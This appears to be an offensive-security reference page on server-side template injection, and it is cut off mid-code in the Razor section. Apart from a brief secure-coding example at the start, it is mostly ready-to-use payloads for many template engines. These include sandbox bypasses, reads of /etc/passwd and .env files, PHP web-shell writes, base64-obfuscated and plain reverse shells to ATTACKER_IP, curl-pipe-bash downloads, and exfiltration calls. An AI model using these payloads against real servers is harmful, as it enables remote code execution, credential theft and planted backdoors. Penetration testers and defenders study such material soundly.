---
title: Server-Side Template Injection (SSTI)
description: Complete breakdown of SSTI attack vectors, payload collections across all major template engines, detection methodology, sandbox escapes, and privilege escalation from template rendering to full remote code execution.
navigation:
  icon: i-lucide-file-terminal
  title: SSTI Attack
---

## What is Server-Side Template Injection?

Server-Side Template Injection (SSTI) is a vulnerability that occurs when an attacker can **inject malicious template directives into a template engine** that is processed on the server. Template engines are designed to combine static templates with dynamic data to generate HTML, emails, PDFs, or other output. When user input is **embedded directly into a template string** rather than passed as data, the template engine interprets it as code — enabling the attacker to execute **arbitrary server-side expressions and commands**.

::callout
---
icon: i-lucide-triangle-alert
color: amber
---
SSTI is critically dangerous because template engines are tightly integrated with the application's runtime environment. Unlike client-side template injection (which affects only the browser), SSTI executes on the **server** — providing direct access to the application's language runtime, file system, environment variables, and operating system. A single SSTI vulnerability frequently leads to **full Remote Code Execution (RCE)**.
::

The vulnerability exists because developers mistakenly **concatenate user input into template strings** instead of passing it as a safe data parameter.

```text [Vulnerable vs Secure Template Usage]
# ============ VULNERABLE ============
# User input is embedded INTO the template string itself
# The template engine processes it as template code

# Python (Jinja2)
template_string = f"Hello {user_input}!"     # user_input = "{{7*7}}"
result = render_template_string(template_string)
# Output: "Hello 49!"  ← Template engine executed 7*7

# ============ SECURE ============
# User input is passed as DATA to a fixed template
# The template engine treats it as a plain string

template_string = "Hello {{name}}!"
result = render_template_string(template_string, name=user_input)
# Output: "Hello {{7*7}}!"  ← Rendered as literal text
```

---

## Template Engines & Detection

Understanding which template engine is in use is critical — each has different syntax, capabilities, and exploitation techniques.

::tabs
  :::tabs-item{icon="i-lucide-list" label="Common Template Engines"}

  | Language | Template Engine | Syntax | Detection Payload |
  |----------|----------------|--------|-------------------|
  | Python | Jinja2 | `{{ }}` / `{% %}` | `{{7*7}}` → `49` |
  | Python | Mako | `${}` / `<% %>` | `${7*7}` → `49` |
  | Python | Tornado | `{{ }}` / `{% %}` | `{{7*7}}` → `49` |
  | Python | Django | `{{ }}` / `{% %}` | `{{7*7}}` (limited sandbox) |
  | Java | Thymeleaf | `${}`/ `*{}` | `${7*7}` → `49` |
  | Java | FreeMarker | `${}` / `<# >` | `${7*7}` → `49` |
  | Java | Velocity | `${}` / `#` | `${{7*7}}` |
  | Java | Pebble | `{{ }}` / `{% %}` | `{{7*7}}` → `49` |
  | Java | Groovy | `${}` / `<% %>` | `${7*7}` → `49` |
  | JavaScript | Pug/Jade | `#{}` / `-` | `#{7*7}` → `49` |
  | JavaScript | EJS | `<%= %>` | `<%= 7*7 %>` → `49` |
  | JavaScript | Handlebars | `{{ }}` | `{{this}}` |
  | JavaScript | Nunjucks | `{{ }}` / `{% %}` | `{{7*7}}` → `49` |
  | JavaScript | Mustache | `{{ }}` | `{{.}}` (logic-less) |
  | PHP | Twig | `{{ }}` / `{% %}` | `{{7*7}}` → `49` |
  | PHP | Smarty | `{}` / `{if}` | `{7*7}` or `{php}` |
  | PHP | Blade | `{{ }}` / `@` | `{{7*7}}` → `49` |
  | Ruby | ERB | `<%= %>` / `<% %>` | `<%= 7*7 %>` → `49` |
  | Ruby | Slim | `=` / `-` | `= 7*7` → `49` |
  | Ruby | Liquid | `{{ }}` / `{% %}` | `{{7*7}}` (sandboxed) |
  | Go | html/template | `{{ }}` | `{{.}}` |
  | Go | text/template | `{{ }}` | `{{.}}` |
  | .NET | Razor | `@` / `@{}` | `@(7*7)` → `49` |
  | Rust | Tera | `{{ }}` / `{% %}` | `{{7*7}}` |

  :::

  :::tabs-item{icon="i-lucide-search" label="Detection Methodology"}

  ::steps{level="4"}

  #### Inject mathematical expression

  ```text
  # Try basic math expressions in all common syntaxes:
  {{7*7}}
  ${7*7}
  #{7*7}
  <%= 7*7 %>
  {7*7}
  {{7*'7'}}
  ${{7*7}}
  @(7*7)
  #{ 7 * 7 }
  ```

  If any returns `49`, SSTI is confirmed. The syntax that worked identifies the engine family.

  #### Differentiate the engine

  Use engine-specific polyglot payloads to narrow down the exact engine.

  ```text [Polyglot Detection Flow]
  # Step 1: Try {{7*7}}
  # If 49 → Jinja2, Twig, Nunjucks, Pebble, or similar
  # If error → Not these engines

  # Step 2: Try {{7*'7'}}
  # If 7777777 → Jinja2 (string multiplication)
  # If 49 → Twig (arithmetic)

  # Step 3: Try ${7*7}
  # If 49 → Mako, FreeMarker, Thymeleaf, Groovy, or EL
  # If literal ${7*7} → Not these engines

  # Step 4: Try <%= 7*7 %>
  # If 49 → ERB (Ruby), EJS (JavaScript), or JSP
  # If literal → Not these engines

  # Step 5: Try #{7*7}
  # If 49 → Pug/Jade or Ruby interpolation
  ```

  #### Confirm with engine-specific fingerprint

  ```text [Engine-Specific Confirmation]
  # Jinja2 confirmation:
  {{config}}
  {{self.__class__}}
  {{request.application}}

  # Twig confirmation:
  {{_self.env.getRuntimeLoaderSources()}}
  {{'test'|upper}}

  # FreeMarker confirmation:
  ${.version}
  <#assign x = 1>

  # Mako confirmation:
  ${self.module.__file__}

  # Thymeleaf confirmation:
  ${T(java.lang.Runtime)}

  # ERB confirmation:
  <%= Ruby.platform %>
  <%= RUBY_VERSION %>

  # EJS confirmation:
  <%= process.version %>
  ```

  #### Escalate to RCE

  Once the engine is identified, use engine-specific payloads for code execution.

  ::
  :::

  :::tabs-item{icon="i-lucide-git-branch" label="Decision Tree"}

  ```text [SSTI Engine Identification Decision Tree]
  START
    │
    ├── Try: {{7*7}}
    │   ├── Returns 49
    │   │   ├── Try: {{7*'7'}}
    │   │   │   ├── Returns 7777777 → Jinja2 / Nunjucks
    │   │   │   ├── Returns 49     → Twig
    │   │   │   └── Error          → Unknown {{ }} engine
    │   │   │
    │   │   └── Try: {{config}}
    │   │       ├── Returns config data → Jinja2 (Flask)
    │   │       └── Error/empty         → Try {{_self}}
    │   │           ├── Returns object  → Twig
    │   │           └── Error           → Pebble / Nunjucks
    │   │
    │   └── Returns literal / error
    │       │
    │       ├── Try: ${7*7}
    │       │   ├── Returns 49
    │       │   │   ├── Try: ${.version}
    │       │   │   │   ├── Returns version → FreeMarker
    │       │   │   │   └── Error
    │       │   │   │       ├── Try: ${T(java.lang.Runtime)}
    │       │   │   │       │   ├── Returns class → Thymeleaf / SpEL
    │       │   │   │       │   └── Error → Mako / Groovy
    │       │   │   │       └── Try: ${self.module.__file__}
    │       │   │   │           ├── Returns path → Mako
    │       │   │   │           └── Error → Groovy / EL
    │       │   │   │
    │       │   └── Returns literal / error
    │       │       │
    │       │       ├── Try: <%= 7*7 %>
    │       │       │   ├── Returns 49
    │       │       │   │   ├── Try: <%= RUBY_VERSION %>
    │       │       │   │   │   ├── Returns version → ERB (Ruby)
    │       │       │   │   │   └── Error
    │       │       │   │   │       ├── Try: <%= process.version %>
    │       │       │   │   │       │   ├── Returns version → EJS (Node.js)
    │       │       │   │   │       │   └── Error → JSP
    │       │       │   │
    │       │       │   └── Returns literal / error
    │       │       │       │
    │       │       │       ├── Try: #{7*7}
    │       │       │       │   ├── Returns 49 → Pug/Jade
    │       │       │       │   └── Literal → Try other engines
    │       │       │       │
    │       │       │       └── Try: @(7*7)
    │       │       │           ├── Returns 49 → Razor (.NET)
    │       │       │           └── Literal → Unknown / Custom engine
  ```
  :::
::

---

## Python Template Engine Payloads

### Jinja2 (Flask / Django Jinja)

Jinja2 is the most commonly exploited template engine due to Flask's popularity.

::tabs
  :::tabs-item{icon="i-lucide-flask-conical" label="Information Disclosure"}

  ::code-group
  ```text [Configuration & Environment]
  # Flask config (contains SECRET_KEY, database URIs, etc.)
  {{config}}
  {{config.items()}}
  {{config['SECRET_KEY']}}
  {{config['SQLALCHEMY_DATABASE_URI']}}

  # Request object
  {{request}}
  {{request.environ}}
  {{request.headers}}
  {{request.cookies}}
  {{request.args}}
  {{request.form}}

  # Application object
  {{request.application.__self__}}
  {{request.application.__globals__}}

  # Self reference
  {{self}}
  {{self.__class__}}
  {{self.__class__.__mro__}}

  # Debug info
  {{g}}
  {{session}}
  {{url_for.__globals__}}
  ```

  ```text [Python Object Introspection]
  # Class hierarchy traversal
  {{''.__class__}}
  {{''.__class__.__mro__}}
  {{''.__class__.__mro__[1]}}
  {{''.__class__.__mro__[1].__subclasses__()}}

  # Count available subclasses
  {{''.__class__.__mro__[1].__subclasses__()|length}}

  # Find specific class index
  # (output all subclasses and look for useful ones)
  {{''.__class__.__mro__[2].__subclasses__()}}

  # Get __builtins__
  {{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']}}
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Remote Code Execution"}

  ::code-group
  ```text [RCE — MRO Chain (Most Common)]
  # Step 1: Find the index of a useful class (e.g., subprocess.Popen, os._wrap_close)
  # This varies by Python version. Common approach:

  # Find os._wrap_close or similar
  {{''.__class__.__mro__[1].__subclasses__()}}
  # Look for <class 'os._wrap_close'> or <class 'subprocess.Popen'>
  # Note the index (e.g., 132)

  # Step 2: Use the class to execute commands
  {{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}

  # Common indexes (vary by Python version):
  # Python 3.8-3.10: os._wrap_close is often around index 132-140
  # Python 3.11+: indexes shift

  # Generic — works on many versions:
  {{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
  ```

  ```text [RCE — Automated Subclass Search]
  # Find the right index automatically using Jinja2 loop
  {% for cls in ''.__class__.__mro__[1].__subclasses__() %}
    {% if 'popen' in cls.__name__.lower() or 'wrap' in cls.__name__.lower() %}
      {{loop.index0}}: {{cls}}
    {% endif %}
  {% endfor %}

  # Or find classes that have os in their globals
  {% for cls in ''.__class__.__mro__[1].__subclasses__() %}
    {% if cls.__init__.__globals__.get('os') %}
      {{loop.index0}}: {{cls}} — HAS OS MODULE
    {% endif %}
  {% endfor %}
  ```

  ```text [RCE — Via __builtins__]
  # Access __builtins__ through any subclass with __init__.__globals__

  # Import os module
  {{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

  # Import subprocess
  {{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output('id',shell=True).decode()}}

  # Using eval
  {{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}

  # Using exec
  {{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['exec']("import os; os.system('id')")}}
  ```

  ```text [RCE — Via config/request Globals]
  # Through Flask config (cleaner approach)
  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}

  # Through request object
  {{request.__class__.__mro__[1].__init__.__globals__['os'].popen('id').read()}}
  {{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}

  # Through url_for
  {{url_for.__globals__['os'].popen('id').read()}}
  {{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

  # Through lipsum (Jinja2 built-in)
  {{lipsum.__globals__['os'].popen('id').read()}}

  # Through cycler
  {{cycler.__init__.__globals__['os'].popen('id').read()}}

  # Through joiner
  {{joiner.__init__.__globals__['os'].popen('id').read()}}

  # Through namespace
  {{namespace.__init__.__globals__['os'].popen('id').read()}}
  ```

  ```text [RCE — Reverse Shell]
  # Bash reverse shell
  {{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read()}}

  # Python reverse shell
  {{config.__class__.__init__.__globals__['os'].popen('python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'').read()}}

  # Netcat reverse shell
  {{lipsum.__globals__['os'].popen('nc ATTACKER_IP 4444 -e /bin/bash').read()}}

  # Curl + execute
  {{lipsum.__globals__['os'].popen('curl http://ATTACKER_IP/shell.sh | bash').read()}}
  ```

  ```text [RCE — File Operations]
  # Read files
  {{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
  {{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}

  # Write files (web shell)
  {{config.__class__.__init__.__globals__['os'].popen('echo "<?php system($_GET[c]); ?>" > /var/www/html/shell.php').read()}}

  # Read Flask source code
  {{config.__class__.__init__.__globals__['os'].popen('cat app.py').read()}}

  # Read environment variables
  {{config.__class__.__init__.__globals__['os'].popen('env').read()}}
  {{config.__class__.__init__.__globals__['os'].environ}}
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-shield-off" label="Sandbox Bypass"}

  ::code-group
  ```text [Bypass: Blocked Underscores (__)]
  # Using attr() filter
  {{''|attr('__class__')|attr('__mro__')|last|attr('__subclasses__')()|list}}

  # Using request object
  {{request|attr('application')|attr('__self__')|attr('_get_data_for_json')|attr('__globals__')}}

  # Using string concatenation
  {{''|attr('\x5f\x5fclass\x5f\x5f')}}
  {{''|attr('_'+'_class_'+'_')}}

  # Using format string
  {{''|attr('%s%sclass%s%s'|format('_','_','_','_'))}}

  # Using Jinja2 ~ operator (concatenation)
  {{''|attr('_''_''class''_''_')}}

  # Using hex encoding
  {{''|attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f')}}
  ```

  ```text [Bypass: Blocked Dots (.)]
  # Using [] bracket notation
  {{''['__class__']['__mro__'][1]['__subclasses__']()}}
  {{config['__class__']['__init__']['__globals__']['os']['popen']('id')['read']()}}

  # Using |attr() filter
  {{''|attr('__class__')|attr('__mro__')}}

  # Using getattr
  {{request|attr('application')}}
  ```

  ```text [Bypass: Blocked Brackets ([ ])]
  # Using __getitem__
  {{''.__class__.__mro__.__getitem__(1).__subclasses__()}}

  # Using |attr() with pop/list
  {{''.__class__.__mro__|list|attr('pop')(1)}}

  # Using Jinja2 filters
  {{(''.__class__.__mro__|list).pop(1).__subclasses__()}}
  ```

  ```text [Bypass: Blocked Quotes (' ")]
  # Using chr() function
  {{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__.__builtins__.chr}}
  # Then construct strings: chr(111)+chr(115) = "os"

  # Using request object values
  {{request.args.cmd}}
  # Pass command as URL parameter: ?cmd=id

  {{request.cookies.cmd}}
  # Pass command as cookie: Cookie: cmd=id

  {{request.headers.cmd}}
  # Pass command as header: cmd: id

  # Using string formatting
  {{'%c%c'|format(111,115)}}  # "os"
  ```

  ```text [Bypass: Blocked Keywords (config, class, import)]
  # String concatenation
  {{''|attr('__cla'+'ss__')}}
  {{''|attr('__cl''ass__')}}

  # Reverse string
  {{''|attr('__ssalc__'[::-1])}}

  # Using getattr + request
  {{request|attr(request.args.a)}}
  # URL: ?a=__class__

  # Hex encoding
  {{''|attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f')}}

  # Unicode encoding
  {{''|attr('\u005f\u005fclass\u005f\u005f')}}

  # Base64 in expression
  {{''|attr('X19jbGFzc19f'|b64decode)}}
  ```

  ```text [Bypass: Combination Techniques]
  # Full RCE with dots, underscores, and quotes blocked:
  # Use request.args for everything

  {{()|attr(request.args.c)|attr(request.args.m)|last|attr(request.args.s)()|attr(request.args.g)(request.args.i)|attr(request.args.gl)|attr(request.args.gi)(request.args.o)|attr(request.args.p)(request.args.cmd)|attr(request.args.r)()}}
  # URL: ?c=__class__&m=__mro__&s=__subclasses__&g=__getitem__&i=INDEX&gl=__init__&gi=__globals__&o=os&p=popen&cmd=id&r=read

  # Or simpler approach with lipsum
  {{lipsum|attr(request.args.g)|attr(request.args.gi)(request.args.o)|attr(request.args.p)(request.args.c)|attr(request.args.r)()}}
  # URL: ?g=__globals__&gi=__getitem__&o=os&p=popen&c=id&r=read
  ```
  ::
  :::
::

### Mako (Python)

::code-group
```text [Mako — Information Disclosure]
# Direct Python execution (Mako uses Python directly)
${self.module.__file__}
${self.module.__loader__}
${self.template.module.__file__}

# Environment info
${dir()}
${locals()}
${globals()}
```

```text [Mako — RCE]
# Direct Python code execution
<%
  import os
  result = os.popen('id').read()
%>
${result}

# One-liner
${__import__('os').popen('id').read()}

# Using expression
${"".join(__import__('os').popen('id').readlines())}

# Reverse shell
<%
  import socket,subprocess,os
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("ATTACKER_IP",4444))
  os.dup2(s.fileno(),0)
  os.dup2(s.fileno(),1)
  os.dup2(s.fileno(),2)
  subprocess.call(["/bin/bash","-i"])
%>

# File read
${open('/etc/passwd').read()}

# File write
<%
  f = open('/var/www/html/shell.php', 'w')
  f.write('<?php system($_GET["c"]); ?>')
  f.close()
%>
```
::

### Tornado (Python)

::code-group
```text [Tornado — RCE]
# Tornado templates allow direct Python
{% import os %}
{{ os.popen('id').read() }}

# One-liner
{{__import__('os').popen('id').read()}}

# File read
{% import os %}{{ os.popen('cat /etc/passwd').read() }}

# Reverse shell
{% import os %}{{ os.popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read() }}
```
::

---

## Java Template Engine Payloads

### FreeMarker

::code-group
```text [FreeMarker — Information Disclosure]
# Version
${.version}

# Data model
${.data_model}
${.data_model.keySet()}

# Environment
${.locale}
${.current_template_name}
${.main_template_name}

# Java system properties
${"freemarker.template.utility.Execute"?new()("id")}
```

```text [FreeMarker — RCE]
# Built-in Execute (most common)
${"freemarker.template.utility.Execute"?new()("id")}
${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
${"freemarker.template.utility.Execute"?new()("whoami")}

# ObjectConstructor
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.Runtime").getRuntime().exec("id")}

# JythonRuntime
${"freemarker.template.utility.JythonRuntime"?new()("import os; os.system('id')")}

# Using assign
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
${ex("cat /etc/passwd")}
${ex("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}")}

# File read via Runtime
<#assign runtime=".getClass().forName('java.lang.Runtime').getRuntime()">
<#assign process=runtime.exec(["cat","/etc/passwd"])>
<#assign is=process.getInputStream()>
<#assign reader="java.io.BufferedReader"?new("java.io.InputStreamReader"?new(is))>
<#assign line=reader.readLine()>
${line}

# Using new() with ProcessBuilder
<#assign pb = "java.lang.ProcessBuilder"?new(["id"])>
<#assign process = pb.start()>
<#assign is = process.getInputStream()>
<#assign isr = "java.io.InputStreamReader"?new(is)>
<#assign br = "java.io.BufferedReader"?new(isr)>
${br.readLine()}

# Reverse shell
${"freemarker.template.utility.Execute"?new()("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")}
```
::

### Thymeleaf (Spring)

::code-group
```text [Thymeleaf — SpEL (Spring Expression Language)]
# Detection
${7*7}
${T(java.lang.Runtime)}
${T(java.lang.System).getenv()}

# Information disclosure
${T(java.lang.System).getenv()}
${T(java.lang.System).getProperty("user.dir")}
${T(java.lang.System).getProperty("os.name")}
${T(java.lang.System).getProperty("java.version")}

# RCE via Runtime
${T(java.lang.Runtime).getRuntime().exec("id")}

# RCE with output capture
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}

# RCE via ProcessBuilder
${new java.lang.ProcessBuilder(new java.lang.String[]{"id"}).start()}

# URL-based injection (path variable)
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x

# Fragment expression injection
~{::__${T(java.lang.Runtime).getRuntime().exec("id")}__}

# With output (Spring specific)
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

```text [Thymeleaf — Preprocessing Injection]
# Thymeleaf preprocesses __${...}__ before template parsing

# URL path injection
/path?lang=__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

# In template attributes
th:text="${__${T(java.lang.Runtime).getRuntime().exec('id')}__}"

# Fragment injection
/path?section=__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```
::

### Velocity (Apache)

::code-group
```text [Velocity — RCE]
# Class loading
#set($runtime = $class.inspect("java.lang.Runtime").type)
#set($process = $runtime.getRuntime().exec("id"))
$process.waitFor()
#set($is = $process.getInputStream())
#set($isr = $class.inspect("java.io.InputStreamReader").type.getConstructor($is.getClass()).newInstance($is))
#set($br = $class.inspect("java.io.BufferedReader").type.getConstructor($isr.getClass()).newInstance($isr))
$br.readLine()

# Simplified
#set($ex = $class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex

# Using ClassTool
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")

# File read
#set($str = "")
#set($is = $class.inspect("java.io.FileInputStream").type.getConstructor($str.getClass()).newInstance("/etc/passwd"))
#set($isr = $class.inspect("java.io.InputStreamReader").type.getConstructor($is.getClass()).newInstance($is))
#set($br = $class.inspect("java.io.BufferedReader").type.getConstructor($isr.getClass()).newInstance($isr))
$br.readLine()
```
::

### Pebble (Java)

::code-group
```text [Pebble — RCE]
# Basic detection
{{7*7}}

# Variable access
{{request}}
{{beans}}

# RCE via beans
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{(1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray())}}

# Alternative
{% set runtime = beans.get("").getClass().forName("java.lang.Runtime") %}
{% set process = runtime.getMethod("exec", "".getClass()).invoke(runtime.getMethod("getRuntime").invoke(null), "id") %}
{{process.getInputStream().readAllBytes()}}
```
::

---

## JavaScript Template Engine Payloads

### EJS (Embedded JavaScript)

::code-group
```text [EJS — RCE]
# Basic detection
<%= 7*7 %>

# Node.js information
<%= process.version %>
<%= process.platform %>
<%= process.cwd() %>
<%= process.env %>
<%= process.env.PATH %>

# RCE — require
<%= require('child_process').execSync('id').toString() %>
<%= require('child_process').execSync('cat /etc/passwd').toString() %>
<%= require('child_process').execSync('whoami').toString() %>
<%= require('child_process').execSync('env').toString() %>

# RCE — global.process
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>

# File read
<%= require('fs').readFileSync('/etc/passwd','utf-8') %>
<%= require('fs').readFileSync('.env','utf-8') %>
<%= require('fs').readFileSync('package.json','utf-8') %>

# File write (web shell)
<%= require('fs').writeFileSync('/var/www/html/shell.php','<?php system($_GET["c"]); ?>') %>

# Reverse shell
<%= require('child_process').execSync('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"') %>

# Network exfiltration
<%= require('child_process').execSync('curl http://ATTACKER_IP/'+require('os').hostname()) %>

# Directory listing
<%= require('fs').readdirSync('.').join('\\n') %>
<%= require('fs').readdirSync('/').join('\\n') %>
```
::

### Pug / Jade (JavaScript)

::code-group
```text [Pug/Jade — RCE]
# Detection
#{7*7}

# Code execution (unbuffered)
- var x = require('child_process').execSync('id').toString()
p= x

# Inline expression
#{require('child_process').execSync('id').toString()}

# File read
#{require('fs').readFileSync('/etc/passwd','utf-8')}

# Multi-line code block
-
  var exec = require('child_process').execSync;
  var result = exec('id').toString();
p= result

# Reverse shell
- require('child_process').execSync('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"')
```
::

### Nunjucks (JavaScript)

::code-group
```text [Nunjucks — RCE]
# Detection
{{7*7}}
{{7*'7'}}

# RCE via range.constructor
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}

# RCE via __proto__
{{range.__proto__.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}

# File read
{{range.constructor("return global.process.mainModule.require('fs').readFileSync('/etc/passwd','utf-8')")()}}

# Environment variables
{{range.constructor("return global.process.env")()}}

# Reverse shell
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"')")()}}
```
::

### Handlebars (JavaScript)

::code-group
```text [Handlebars — RCE (via prototype pollution or helper abuse)]
# Detection (Handlebars is logic-less, limited injection)
{{this}}
{{this.constructor}}

# RCE requires prototype pollution or custom helpers

# Via constructor
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id').toString()"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

# Simpler (if vulnerable version)
{{constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')()}}
```
::

---

## PHP Template Engine Payloads

### Twig

::code-group
```text [Twig — Information Disclosure]
# Detection
{{7*7}}
{{7*'7'}}  # Returns 49 (not 7777777 like Jinja2)

# Self reference
{{_self}}
{{_self.env}}
{{_self.env.getLoader()}}

# Twig version
{{constant('Twig\\Environment::VERSION')}}
{{constant('Twig_Environment::VERSION')}}

# App info
{{app.request.server.all|join(',')}}
{{app.request.headers.all|join(',')}}
{{dump()}}
```

```text [Twig — RCE]
# Twig 1.x — getFilter
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# Twig 1.x — setCache + include
{{_self.env.setCache("ftp://attacker.com/")}}{{_self.env.loadTemplate("evil")}}

# Twig 2.x-3.x — filter function
{{['id']|filter('exec')}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('exec')}}
{{['id']|filter('passthru')}}

# Using map
{{['id']|map('exec')}}
{{['id']|map('system')}}
{{['id']|map('passthru')}}

# Using reduce
{{[0,'id']|reduce('system')}}

# Using sort
{{['id']|sort('exec')}}

# File read
{{'/etc/passwd'|file_get_contents}}
{{"<?php system('id'); ?>"|raw}}

# Reverse shell
{{['bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"']|filter('system')}}

# Twig 3.x — include/source
{{include('/etc/passwd')}}
{{source('/etc/passwd')}}
```
::

### Smarty (PHP)

::code-group
```text [Smarty — RCE]
# Detection
{7*7}

# Smarty tag execution (older versions)
{php}echo `id`;{/php}

# Smarty 3.x tags (deprecated but may work)
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

# Using if tag
{if phpinfo()}{/if}
{if system('id')}{/if}
{if exec('id')}{/if}
{if passthru('id')}{/if}
{if shell_exec('id')}{/if}

# Using math
{math equation="x]y" x="system('id')" y=1}

# Using self
{self::getStreamVariable("file:///etc/passwd")}

# Fetch
{fetch file="/etc/passwd"}

# File read
{include file="file:///etc/passwd"}
```
::

### Blade (Laravel/PHP)

::code-group
```text [Blade — Information Disclosure & RCE]
# Detection
{{7*7}}
{!! 7*7 !!}

# Blade double-curly escapes HTML by default
# Use {!! !!} for unescaped output

# RCE
{!! system('id') !!}
{!! exec('id') !!}
{!! shell_exec('id') !!}
{!! passthru('id') !!}
{!! `id` !!}

# File read
{!! file_get_contents('/etc/passwd') !!}

# Environment
{!! phpinfo() !!}
{!! getenv('APP_KEY') !!}

# Include sensitive files
@include('../../.env')

# PHP code injection
@php
  system('id');
@endphp

# Reverse shell
{!! system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"') !!}
```
::

---

## Ruby Template Engine Payloads

### ERB (Embedded Ruby)

::code-group
```text [ERB — RCE]
# Detection
<%= 7*7 %>
<%= RUBY_VERSION %>

# System commands
<%= system('id') %>
<%= `id` %>
<%= exec('id') %>
<%= IO.popen('id').read %>
<%= %x(id) %>

# File read
<%= File.read('/etc/passwd') %>
<%= IO.read('/etc/passwd') %>
<%= File.open('/etc/passwd').read %>

# Environment
<%= ENV.inspect %>
<%= ENV['PATH'] %>

# Directory listing
<%= Dir.entries('/').join("\n") %>
<%= Dir.glob('**/*').join("\n") %>

# Reverse shell
<%= system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"') %>
<%= `bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"` %>

# Ruby code execution
<% require 'socket'; TCPSocket.open('ATTACKER_IP',4444){|s| while(l=s.gets);IO.popen(l,"r"){|io|s.print io.read}end} %>
```
::

### Slim (Ruby)

::code-group
```text [Slim — RCE]
# Detection
= 7*7

# RCE
= system('id')
= `id`
= IO.popen('id').read

# File read
= File.read('/etc/passwd')

# Code block
- result = `id`
= result

# Reverse shell
= system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"')
```
::

---

## .NET Template Engine Payloads

### Razor (ASP.NET)

::code-group
```text [Razor — RCE]
# Detection
@(7*7)
@{var x = 7*7;}@x

# Information disclosure
@System.Environment.OSVersion
@System.Environment.MachineName
@System.Environment.UserName
@System.IO.Directory.GetCurrentDirectory()

# File read
@System.IO.File.ReadAllText("C:\\Windows\\win.ini")
@System.IO.File.ReadAllText("/etc/passwd")

# RCE via Process
@{
  var p = new System.Diagnostics.Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c whoami";
  p.StartInfo.RedirectStandardOutput = true;
